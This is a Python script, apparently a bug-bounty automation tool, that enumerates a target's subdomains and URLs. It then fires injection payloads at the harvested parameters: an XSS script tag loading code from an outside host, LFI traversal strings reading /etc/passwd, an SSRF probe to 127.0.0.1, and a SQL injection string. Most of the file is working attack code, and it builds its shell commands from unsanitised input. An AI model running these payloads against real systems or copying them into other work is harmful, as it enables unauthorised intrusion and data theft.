import os
import subprocess
import sys
import time

# ANSI color codes for terminal output
BLUE = "\033[0;34m"
RED = "\033[91m"
GREEN = "\033[32m"
END = "\033[0m"

# Banner for the script, displayed at the start
banner = f"""{GREEN}    ______            __                          __  __                   __
   / ____/  ____ _   / /  _____  ____    ____    / / / /  __  __   ____   / /_  ___    _____
  / /_     / __ `/  / /  / ___/ / __ \  / __ \  / /_/ /  / / / /  / __ \ / __/ / _ \  / ___/
 / __/    / /_/ /  / /  / /__  / /_/ / / / / / / __  /  / /_/ /  / / / // /_  /  __/ / /    
/_/       \__,_/  /_/   \___/  \____/ /_/ /_/ /_/ /_/   \__,_/  /_/ /_/ \__/  \___/ /_/     
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {END}"""
print(banner)


def mk_dir(output):
    """Create the output directory structure for storing various types of scan results."""
    try:
        print(f"{GREEN}[+] Creating output directory{END}")
        time.sleep(0.2)

        # Create the main output directory
        os.mkdir(output)
        if os.path.isdir(output):
            # Define subdirectories and create them
            output_dirs = ["hosts", "urls", "vuln"]
            for dirs in output_dirs:
                os.makedirs(os.path.join(output, dirs))

            # Define host-related files and create them
            host_files = ["subs.txt", "httpx.txt", "alive.txt", "asn.txt"]
            hosts_path = os.path.join(output, "hosts")
            for hf in host_files:
                with open(os.path.join(hosts_path, hf), "w"):
                    pass

            # Define URL-related files and create them
            urls = ["all-urls.txt", "params.txt", "js-files.txt", "js-findings.txt", "mantra1.txt"]
            urls_path = os.path.join(output, "urls")
            for u in urls:
                with open(os.path.join(urls_path, u), "w") as b:
                    pass

            # Define files for common vulnerabilities and create them
            gf_urls = ["xss", "lfi", "ssrf", "sqli"]
            gf_path = os.path.join(output, "urls")
            for gf_f in gf_urls:
                with open(os.path.join(gf_path, f"gf-{gf_f}.txt"), "w") as b:
                    pass

            # Define files for specific bugs and create them
            common_bugs = ["xss", "lfi", "ssrf", "sqli", "nuclei-o", "subdomain-takeover"]
            bugs_path = os.path.join(output, "vuln")
            for bugs in common_bugs:
                with open(os.path.join(bugs_path, f"{bugs}.txt"), "w") as c:
                    pass

        time.sleep(0.2)
        print(f"{GREEN}[+] Directory successfully created{END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def subdomain(hosts, output):
    """Collect subdomains using tools like subfinder and amass."""
    time.sleep(0.2)
    print(f"{GREEN}[+] Collecting subdomains for {hosts}{END}")
    try:
        # Run subfinder to collect subdomains and save the output
        subprocess.run(["subfinder", "-dL", hosts, "-o", os.path.join(output, "hosts", "subs.txt")])
        # Run amass to enumerate subdomains and append the results
        subprocess.run(f"amass enum -df {hosts} | anew {output}/hosts/subs.txt", shell=True)

        # Count the number of collected subdomains
        subs_path = open(f"{output}/hosts/subs.txt")
        subs_count = len(subs_path.readlines())
        subs_path.close()
        print(f"{GREEN}[+] Successfully collected {subs_count} subdomains{END}")
        time.sleep(0.2)
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def probe_subs(output):
    """Probe for alive subdomains using httpx."""
    try:
        print(f"{GREEN}[+] Probing for alive subdomains{END}")

        # Run httpx to check which subdomains are alive and output results
        subprocess.run(["httpx", "-l", f"{output}/hosts/subs.txt", "-sc", "-title", "-td", "-fr", "-o",
                        os.path.join(output, "hosts", "httpx.txt")])

        # Extract alive subdomains and append to alive.txt
        awk_cmd = '{print $1}'
        subprocess.run(f"awk '{awk_cmd}' {output}/hosts/httpx.txt | tee -a {output}/hosts/alive.txt", shell=True)
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def takeovers(output):
    """Testing for subdomain takeovers"""
    try:
        print(f"{GREEN}[+] Testing for Subdomain Takeovers{END}")
        subprocess.run(
            ["subzy", "run", "-targets", f"{output}/hosts/subs.txt", "--vuln", "--output",
             f"{output}/vuln/subdomain-takeover.txt"])
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def urls(output, hosts):
    """Collect URLs and parameters from alive subdomains using tools like waymore and gau."""
    try:
        input_urls = f"{output}/hosts/alive.txt"
        output_urls = f"{output}/urls/all-urls.txt"
        output_params = f"{output}/urls/params.txt"
        print(f"{GREEN}[+] Collecting all URLs and parameters{END}")

        # Use waymore to collect URLs and save the output
        subprocess.run(f"waymore -mode U -i {input_urls} -oU {output_urls}", shell=True)

        # Use waybackurls to gather historical URLs and append to the results
        subprocess.run(f"cat {input_urls} | waybackurls | anew {output_urls}", shell=True)

        # Use gau (GetAllUrls) to gather URLs and append to the results
        subprocess.run(f"cat {input_urls} | gau --subs | anew {output_urls}", shell=True)

        # Collecting all params
        subprocess.run(f"cat {output_urls} | grep \"=\" | tee -a {output_params}", shell=True)
        subprocess.run(f"paramspider -l {hosts} | anew {output_params}", shell=True)

        # Filter all URLs with gf
        gf_filter = ["xss", "lfi", "ssrf", "sqli"]
        for gf in gf_filter:
            subprocess.run(f"cat {output_params} | gf {gf} | tee -a {output}/urls/gf-{gf}.txt", shell=True)

    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def xss(output):
    """Test for XSS vulnerabilities."""
    try:
        output_params_xss = f"{output}/urls/gf-xss.txt"
        output_xss = f"{output}/vuln/xss.txt"
        print(f"{GREEN}[+] Testing for XSS{END}")
        subprocess.run(
            f"cat {output_params_xss} | qsreplace '\"><script src=\"https://X55.is?1=18722\"></script>' | freq | grep -iv 'Not Vulnerable' | tee -a {output_xss}", shell=True)    

    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def lfi(output):
    """Test for LFI vulnerabilities."""
    try:
        print(f"{GREEN}[+] Testing for LFI{END}")
        lfi_wordlist = ["/etc/passwd", "../../../../../../../../../../../../../../../../etc/passwd%00",
                        "../../../../../../../../../../../../etc/passwd"]
        output_params_lfi = f"{output}/urls/gf-lfi.txt"
        output_lfi = f"{output}/vuln/lfi.txt"
        for lfi_p in lfi_wordlist:
            subprocess.run(
                f"cat {output_params_lfi} | qsreplace '{lfi_p}' | freq | grep -iv 'Not Vulnerable' | tee -a {output_lfi}", shell=True)

    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def ssrf(output):
    """Test for SSRF vulnerabilities."""
    try:
        print(f"{GREEN}[+] Testing for SSRF{END}")
        output_params_ssrf = f"{output}/urls/gf-ssrf.txt"
        output_ssrf = f"{output}/vuln/ssrf.txt"
        payload_ssrf = "127.0.0.1:80"
        subprocess.run(
            f"cat {output_params_ssrf} | qsreplace '{payload_ssrf}' | freq | grep -iv 'Not Vulnerable' | tee -a {output_ssrf}",
            shell=True)

    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


def sqli(output):
    """Test for SQLi vulnerabilities."""
    try:
        print(f"{GREEN}[+] Testing for SQLi{END}")
        payload = "' OR 1=1--"
        output_sqli = f"{output}/vuln/sqli.txt"
        output_params_sqli = f"{output}/urls/gf-sqli.txt"
        subprocess.run(
            f"cat {output_params_sqli} | qsreplace '{payload}' | freq | grep -iv 'Not Vulnerable' | tee -a {output_sqli}",
            shell=True)
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")


if __name__ == "__main__":
    hosts = sys.argv[1]
    output = sys.argv[2]
    mk_dir(output)
    subdomain(hosts, output)
    probe_subs(output)
    takeovers(output)
    urls(output, hosts)
    xss(output)
    lfi(output)
    ssrf(output)
    sqli(output)
